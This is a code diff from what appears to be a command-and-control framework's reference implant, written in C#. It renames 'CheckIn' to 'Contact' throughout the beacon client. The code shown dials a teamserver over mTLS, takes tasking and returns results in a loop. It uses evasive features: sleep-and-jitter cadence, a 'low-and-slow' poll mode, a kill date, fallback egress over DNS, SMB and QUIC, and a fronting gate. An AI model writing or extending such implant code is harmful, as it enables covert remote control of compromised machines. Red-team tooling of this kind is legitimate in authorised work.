@@ -13,22 +13,22 @@ using WireBeacon = Rod.V1.Beacon;
 
 namespace Rod.Implant.Internal;
 
-// The reference implant's mTLS check-in client: it opens the long-lived reverse
-// Beacon.CheckIn stream, completes the handshake, and then loops reading
+// The reference implant's mTLS contact client: it opens the long-lived reverse
+// Beacon.Contact stream, completes the handshake, and then loops reading
 // downstream tasking and writing upstream results (architecture.md Sec 5/8,
 // Sec 10.3). The stream is bidirectional frames whose payloads are the rod.v1
 // handshake/task/result messages.
 
 /// <summary>
-/// Runs the implant's check-in lifecycle against the teamserver: dial the mTLS
+/// Runs the implant's contact lifecycle against the teamserver: dial the mTLS
 /// endpoint, complete the handshake, then loop dispatching downstream tasks and
 /// reporting upstream results. Blocks until the cancellation token fires or the
 /// baked-in kill date passes. The cadence follows the baked-in sleep + jitter
 /// profile.
 /// </summary>
-internal sealed class Beacon : ICheckInClient
+internal sealed class Beacon : IContactClient
 {
-    // How one check-in cycle uses the stream. Stream holds the connection open
+    // How one contact cycle uses the stream. Stream holds the connection open
     // for the life of the session -- the interactive shape, server-push
     // tasking with no reconnect cost. Poll drains queued tasking, closes the
     // stream, and sleeps the beacon interval: the low-and-slow shape, where a
@@ -64,7 +64,7 @@ internal sealed class Beacon : ICheckInClient
 
     // The held-task ledger (architecture.md Sec 10.3 -- the dispatch strand):
     // the dedup and result cache behind the receive-ack arm, shared by every
-    // check-in client covering one run the same way the nonce floor is.
+    // contact client covering one run the same way the nonce floor is.
     private readonly HeldTaskLedger _held;
 
     // The shared task-acceptance pipeline (fronting gate, verification,
@@ -83,7 +83,7 @@ internal sealed class Beacon : ICheckInClient
     }
 
     /// <summary>
-    /// Builds a Beacon with an explicit check-in mode ("stream" or "poll"; the
+    /// Builds a Beacon with an explicit contact mode ("stream" or "poll"; the
     /// baked profile or the -mode flag decides). See the field comment for what
     /// each mode trades.
     /// </summary>
@@ -110,9 +110,9 @@ internal sealed class Beacon : ICheckInClient
     /// <paramref name="egress"/> is the baked endpoint walk (Sec 8): the cycle
     /// dials the current entry and a failed cycle advances to the next.
     /// <paramref name="nonces"/> shares the replay-nonce floor with another
-    /// check-in client covering the same run (the envelope client); null keeps
+    /// contact client covering the same run (the envelope client); null keeps
     /// this beacon's own tracker. <paramref name="cadence"/> is the live
-    /// check-in cadence beacon.sleep retunes; null keeps the baked pair.
+    /// contact cadence beacon.sleep retunes; null keeps the baked pair.
     /// <paramref name="held"/> shares the held-task ledger the same way.
     /// </summary>
     public Beacon(EgressEndpoints egress, string implantId, X509Certificate2 leaf, ECDsa privateKey,
@@ -157,7 +157,7 @@ internal sealed class Beacon : ICheckInClient
     /// Sec 8): the mTLS socket the gRPC stream dials. A schemed beacon URL
     /// belongs to another client -- http(s) to the envelope POST cycle or the
     /// WebSocket beacon, quic to the QUIC stream, dns/doh to the DNS carrier,
-    /// tcp/smb to the socket check-in -- so the predicate excludes every
+    /// tcp/smb to the socket contact -- so the predicate excludes every
     /// schemed shape rather than relying on the coordinator's ordering (the
     /// same disjointness the build-side module registry gives its
     /// bare-authority fallthrough).
@@ -176,10 +176,10 @@ internal sealed class Beacon : ICheckInClient
     /// is not hammered at beacon rate. The kill date is checked at the top of
     /// each cycle so a long-running implant self-terminates once it passes, not
     /// only on the next restart (architecture.md Sec 7). Returns
-    /// <see cref="CheckInExit.SwitchTransport"/> when the walk's current entry
+    /// <see cref="ContactExit.SwitchTransport"/> when the walk's current entry
     /// is a web URL, so the coordinator hands the run to the envelope client.
     /// </summary>
-    public async Task<CheckInExit> RunAsync(CancellationToken cancellationToken)
+    public async Task<ContactExit> RunAsync(CancellationToken cancellationToken)
     {
         try
         {
@@ -196,7 +196,7 @@ internal sealed class Beacon : ICheckInClient
         }
     }
 
-    private async Task<CheckInExit> RunCyclesAsync(CancellationToken cancellationToken)
+    private async Task<ContactExit> RunCyclesAsync(CancellationToken cancellationToken)
     {
         var consecutiveFailures = 0;
         while (!cancellationToken.IsCancellationRequested)
@@ -204,14 +204,14 @@ internal sealed class Beacon : ICheckInClient
             if (_killDate is { } killDate && DateTimeOffset.Now > killDate)
             {
                 _log.WriteLine($"beacon kill date {killDate:O} reached; terminating");
-                return CheckInExit.Terminate;
+                return ContactExit.Terminate;
             }
             // The transport selection follows the egress walk's URL shape: a
             // web entry (http(s)://) is the envelope POST client's -- yield so
             // the coordinator hands the run over. Re-checked every cycle, so a
             // walk that crosses shapes re-routes at the next entry.
             if (BeaconUrl.IsWeb(_egress.CurrentBeaconUrl))
-                return CheckInExit.SwitchTransport;
+                return ContactExit.SwitchTransport;
             var cycle = BeaconCycleResult.Dropped;
             try
             {
@@ -239,7 +239,7 @@ internal sealed class Beacon : ICheckInClient
             // date expired, unknown implant -- none of them change on a retry),
             // so the loop ends there instead of reconnecting forever.
             if (cycle == BeaconCycleResult.Terminal)
-                return CheckInExit.Terminate;
+                return ContactExit.Terminate;
 
             if (cycle == BeaconCycleResult.Handshaken)
             {
@@ -263,14 +263,14 @@ internal sealed class Beacon : ICheckInClient
                 // The cadence is read fresh every cycle, so a beacon.sleep
                 // change lands on the very next sleep.
                 var (sleep, jitter) = _cadence?.Current ?? (_sleep, _jitter);
-                await CheckInCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
+                await ContactCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
             }
             catch (OperationCanceledException)
             {
-                return CheckInExit.Terminate;
+                return ContactExit.Terminate;
             }
         }
-        return CheckInExit.Terminate;
+        return ContactExit.Terminate;
     }
 
     // One connect-handshake-task cycle. Returns how the cycle ended so the
@@ -301,7 +301,7 @@ internal sealed class Beacon : ICheckInClient
         });
 
         var client = new WireBeacon.BeaconClient(channel);
-        using var call = client.CheckIn(cancellationToken: cancellationToken);
+        using var call = client.Contact(cancellationToken: cancellationToken);
 
         // The implant speaks first: handshake with its protocol version and
         // identity. The advertised capability set is the baked class verbs
